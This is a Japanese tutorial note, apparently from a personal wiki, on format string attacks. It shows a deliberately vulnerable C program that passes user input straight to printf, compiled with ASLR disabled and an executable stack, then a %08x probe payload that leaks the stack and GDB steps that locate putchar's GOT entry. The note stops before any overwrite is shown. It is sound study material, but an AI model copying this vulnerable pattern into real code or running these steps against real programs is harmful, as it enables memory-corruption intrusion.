<!-- TITLE: Format String Attack -->
<!-- SUBTITLE: A quick summary of Format String Attack -->

# FSBのコード

ももいろテクノロジー様の記事を参考に進めていく[^1]


```c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
    char buf[100];
    printf("[+] buf = %p\n", buf);
    strncpy(buf, argv[1], 100);
    printf(buf);
    putchar('\n');
    return 0;
}
```

# コンパイル

```sh
$ sudo sysctl -a | grep kernel.randomize_va_space
kernel.randomize_va_space = 2
$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
$ gcc -m32 -z execstack fsb.c -o fsb
$ ./fsb $(python -c 'print "AAAA" + ".%08x"*16')
[+] buf = 0xffffd1e8
AAAA.ffffd517.00000064.00f0b5ff.ffffd20e.00000001.000000c2.ffffd304.ffffd20e.ffffd310.41414141.3830252e.30252e78.252e7838.2e783830.78383025.3830252e
```

最初の**AAAA**を*0*とすると、*10*番目に**41414141**、すなわちASCIIコードの**AAAA**が表示されている

# GDB
まず、`print(buf)`に該当する部分にブレークポイントを貼る
&#8942;

```sh
$ gdb -q ./fsb
⋮
gef➤  disas main
Dump of assembler code for function main:
   0x080484cb <+0>:	lea    ecx,[esp+0x4]
   ⋮
   0x08048518 <+77>:	call   0x80483b0 <strncpy@plt>
   0x0804851d <+82>:	add    esp,0x10
   0x08048520 <+85>:	sub    esp,0xc
   0x08048523 <+88>:	lea    eax,[ebp-0x70]
   0x08048526 <+91>:	push   eax
   0x08048527 <+92>:	call   0x8048370 <printf@plt>
   ⋮
	 0x08048534 <+105>:	call   0x80483a0 <putchar@plt>
   ⋮
   0x08048559 <+142>:	ret    
End of assembler dump.
gef➤  b *main+92
Breakpoint 1 at 0x8048527
```

次に、`<putchar@plt>`のアドレスを逆アセンブルして、GOT tableを除く

```sh
gef➤  disas 0x80483a0
Dump of assembler code for function putchar@plt:
   0x080483a0 <+0>:	jmp    DWORD PTR ds:0x804a018
   0x080483a6 <+6>:	push   0x18
   0x080483ab <+11>:	jmp    0x8048360
End of assembler dump.
```

とりあえず実行して、`0x804a018`を*xinfo*コマンドでアドレスの情報を調べる

```sh
gef➤  r AAAA
Starting program: /home/mkm/Develop/unix/c_test/got/fsb AAAA
[+] buf = 0xffffd168
⋮
gef➤  xinfo 0x804a018 
──────────────────────────────────────────[ xinfo: 0x804a018 ]──────────────────────────────────────────
Page: 0x0804a000  →  0x0804b000 (size=0x1000)
Permissions: rwx
Pathname: /home/mkm/Develop/unix/c_test/got/fsb
Offset (from page): 0x18
Inode: 1048602
Segment: .got.plt (0x0804a000-0x0804a020)
Symbol: _GLOBAL_OFFSET_TABLE_+24
```

